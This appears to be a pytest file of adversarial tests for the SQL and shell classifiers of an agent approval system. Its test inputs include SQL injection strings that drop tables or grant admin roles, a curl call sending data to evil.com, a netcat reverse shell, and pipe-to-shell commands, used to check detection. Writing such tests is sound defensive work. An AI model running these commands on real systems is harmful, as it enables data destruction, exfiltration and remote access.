"""Adversarial SQL classifier tests.

Tests the SQL classifier against evasion attempts:
- Multi-statement injection (SELECT 1; DROP TABLE x)
- Transaction control tricks (BEGIN; COMMIT; ROLLBACK)
- Encoded payloads and obfuscation
- SQL parser evasion attempts
- Comment-based injection
- Stacked queries
- UNION-based injection
- Subquery tricks

The classifier MUST:
- Detect multi-statement payloads and mark them opaque
- Detect transaction control commands and mark them opaque
- Fail closed (opaque=True, requires_approval=True) on anything it cannot parse
- Never classify a dangerous operation as a safe SELECT
"""

from __future__ import annotations

import pytest

from ep_governance.classification import SQLClassifier, ShellClassifier, ClassificationConfidence


@pytest.fixture
def classifier():
    return SQLClassifier()


class TestMultiStatementInjection:
    """Multi-statement payloads must be detected and marked opaque."""

    def test_select_then_drop(self, classifier):
        """SELECT 1; DROP TABLE users — must be opaque."""
        result = classifier.classify("postgres.execute", {"sql": "SELECT 1; DROP TABLE users"})
        assert result.opaque is True
        assert result.requires_approval is True
        assert "multi" in result.action_type or result.action_type == "postgres.execute.opaque"

    def test_select_then_insert(self, classifier):
        """SELECT 1; INSERT INTO foo VALUES (1) — must be opaque."""
        result = classifier.classify("postgres.execute", {
            "sql": "SELECT 1; INSERT INTO foo VALUES (1)"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_select_then_update(self, classifier):
        """SELECT 1; UPDATE users SET role='admin' — must be opaque."""
        result = classifier.classify("postgres.execute", {
            "sql": "SELECT 1; UPDATE users SET role='admin' WHERE id=1"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_multiple_selects(self, classifier):
        """SELECT 1; SELECT 2 — multi-statement, must be opaque."""
        result = classifier.classify("postgres.execute", {"sql": "SELECT 1; SELECT 2"})
        assert result.opaque is True
        assert result.requires_approval is True

    def test_select_with_trailing_semicolon(self, classifier):
        """SELECT 1; — trailing semicolon is OK, single statement."""
        result = classifier.classify("postgres.execute", {"sql": "SELECT 1;"})
        assert result.opaque is False
        assert result.action_type == "postgres.execute.select"

    def test_drop_then_select(self, classifier):
        """DROP TABLE x; SELECT 1 — multi-statement, must be opaque."""
        result = classifier.classify("postgres.execute", {"sql": "DROP TABLE x; SELECT 1"})
        assert result.opaque is True
        assert result.requires_approval is True


class TestTransactionControl:
    """Transaction control commands must be detected and handled."""

    def test_begin_commit(self, classifier):
        """BEGIN; COMMIT; — transaction control, must be opaque or classified."""
        result = classifier.classify("postgres.execute", {"sql": "BEGIN; COMMIT;"})
        assert result.opaque is True
        assert result.requires_approval is True

    def test_rollback(self, classifier):
        """ROLLBACK; — transaction control."""
        result = classifier.classify("postgres.execute", {"sql": "ROLLBACK;"})
        assert result.opaque is True or result.action_type == "postgres.execute.rollback"
        assert result.requires_approval is True

    def test_begin_then_drop(self, classifier):
        """BEGIN; DROP TABLE users; COMMIT; — must be opaque (multi-statement)."""
        result = classifier.classify("postgres.execute", {
            "sql": "BEGIN; DROP TABLE users; COMMIT;"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_set_isolation(self, classifier):
        """SET TRANSACTION ISOLATION LEVEL READ COMMITTED; — SET command."""
        result = classifier.classify("postgres.execute", {
            "sql": "SET TRANSACTION ISOLATION LEVEL READ COMMITTED"
        })
        # SET should be classified, not opaque (it's a recognized operation)
        assert result.action_type == "postgres.execute.set"
        assert result.requires_approval is True


class TestCommentInjection:
    """Comment-based injection attempts."""

    def test_inline_comment_drop(self, classifier):
        """SELECT 1 --; DROP TABLE users — inline comment hides DROP."""
        # The multi-statement detector strips string literals but not comments.
        # sqlglot should parse this as a single SELECT with a comment.
        result = classifier.classify("postgres.execute", {
            "sql": "SELECT 1 --; DROP TABLE users"
        })
        # If sqlglot sees this as a single SELECT with comment, it's classified as select.
        # That's correct behavior — the comment is not executed.
        # But we need to verify it's NOT classified as a DROP.
        assert "drop" not in result.action_type

    def test_block_comment(self, classifier):
        """SELECT 1 /* DROP TABLE users */ — block comment."""
        result = classifier.classify("postgres.execute", {
            "sql": "SELECT 1 /* DROP TABLE users */"
        })
        assert "drop" not in result.action_type

    def test_comment_then_drop(self, classifier):
        """-- comment\nDROP TABLE users — comment before DROP."""
        result = classifier.classify("postgres.execute", {
            "sql": "-- innocent comment\nDROP TABLE users"
        })
        # This should be classified as DROP (comment is stripped by parser)
        assert result.action_type == "postgres.execute.drop"
        assert result.requires_approval is True


class TestObfuscation:
    """Various obfuscation attempts."""

    def test_empty_sql(self, classifier):
        """Empty SQL string — must be opaque or raise."""
        with pytest.raises(Exception):
            classifier.classify("postgres.execute", {"sql": ""})

    def test_whitespace_only(self, classifier):
        """Whitespace-only SQL — must be opaque."""
        result = classifier.classify("postgres.execute", {"sql": "   "})
        assert result.opaque is True
        assert result.requires_approval is True

    def test_no_sql_key(self, classifier):
        """Missing 'sql' key — must raise ClassificationError."""
        with pytest.raises(Exception):
            classifier.classify("postgres.execute", {"host": "localhost"})

    def test_garbage_sql(self, classifier):
        """Nonsensical SQL — must be opaque."""
        result = classifier.classify("postgres.execute", {"sql": "ASDFGHJKL QWERTYUIOP"})
        assert result.opaque is True
        assert result.requires_approval is True

    def test_binary_data(self, classifier):
        """Binary garbage in SQL — must be opaque."""
        result = classifier.classify("postgres.execute", {"sql": "\x00\x01\x02\x03 DROP"})
        assert result.opaque is True
        assert result.requires_approval is True

    def test_very_long_sql(self, classifier):
        """Very long SQL (10KB) — must not crash, must classify."""
        long_sql = "SELECT " + "1, " * 5000 + "1"
        result = classifier.classify("postgres.execute", {"sql": long_sql})
        assert result.action_type == "postgres.execute.select"
        assert result.opaque is False

    def test_unicode_tricks(self, classifier):
        """Unicode homoglyphs and unusual characters — must not crash."""
        result = classifier.classify("postgres.execute", {
            "sql": "SELECT 1 -- \u200b\u200c\u200d"
        })
        # Should not crash; may be classified as select or opaque
        assert result is not None

    def test_newline_injection(self, classifier):
        """Newline between SELECT and semicolon — must still detect multi-statement."""
        result = classifier.classify("postgres.execute", {
            "sql": "SELECT 1\n;\nDROP TABLE users"
        })
        assert result.opaque is True
        assert result.requires_approval is True


class TestShellEvasion:
    """Shell classifier evasion attempts."""

    @pytest.fixture
    def shell_classifier(self):
        return ShellClassifier()

    def test_encoded_payload_base64(self, shell_classifier):
        """base64 decode pipe — must be opaque."""
        result = shell_classifier.classify("shell.execute", {
            "command": "echo aGVsbG8= | base64 --decode"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_command_substitution(self, shell_classifier):
        """$(command) — must be opaque."""
        result = shell_classifier.classify("shell.execute", {
            "command": "echo $(whoami)"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_backtick_substitution(self, shell_classifier):
        """`command` — must be opaque."""
        result = shell_classifier.classify("shell.execute", {
            "command": "echo `whoami`"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_eval_injection(self, shell_classifier):
        """eval command — must be opaque."""
        result = shell_classifier.classify("shell.execute", {
            "command": "eval 'echo hello'"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_python_interpreter(self, shell_classifier):
        """python -c '...' — must be opaque."""
        result = shell_classifier.classify("shell.execute", {
            "command": "python -c 'import os; os.system(\"id\")'"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_pipe_to_shell(self, shell_classifier):
        """echo x | sh — must be opaque (pipe detected)."""
        result = shell_classifier.classify("shell.execute", {
            "command": "echo hello | sh"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_and_chain(self, shell_classifier):
        """cmd1 && cmd2 — must be opaque (compound command)."""
        result = shell_classifier.classify("shell.execute", {
            "command": "ls -la && whoami"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_semicolon_chain(self, shell_classifier):
        """cmd1; cmd2 — must be opaque (compound command)."""
        result = shell_classifier.classify("shell.execute", {
            "command": "ls; whoami"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_safe_command_ls(self, shell_classifier):
        """ls -la — known bounded command, should classify as shell.exec.ls."""
        result = shell_classifier.classify("shell.execute", {"command": "ls -la"})
        assert result.opaque is False
        assert result.action_type == "shell.exec.ls"
        assert result.classification_confidence == ClassificationConfidence.high

    def test_sudo_escalation(self, shell_classifier):
        """sudo cmd — must be opaque."""
        result = shell_classifier.classify("shell.execute", {"command": "sudo ls"})
        assert result.opaque is True
        assert result.requires_approval is True

    def test_curl_network(self, shell_classifier):
        """curl http://evil.com — must be opaque."""
        result = shell_classifier.classify("shell.execute", {
            "command": "curl http://evil.com/exfil"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_netcat_reverse_shell(self, shell_classifier):
        """nc -e /bin/sh — must be opaque."""
        result = shell_classifier.classify("shell.execute", {
            "command": "nc -e /bin/sh 10.0.0.1 4444"
        })
        assert result.opaque is True
        assert result.requires_approval is True

    def test_empty_command(self, shell_classifier):
        """Empty command — must raise ClassificationError (no command to classify)."""
        with pytest.raises(Exception):
            shell_classifier.classify("shell.execute", {"command": ""})

    def test_unparseable_command(self, shell_classifier):
        """Unparseable command (unbalanced quotes) — must be opaque."""
        result = shell_classifier.classify("shell.execute", {"command": "echo 'unbalanced"})
        assert result.opaque is True
        assert result.requires_approval is True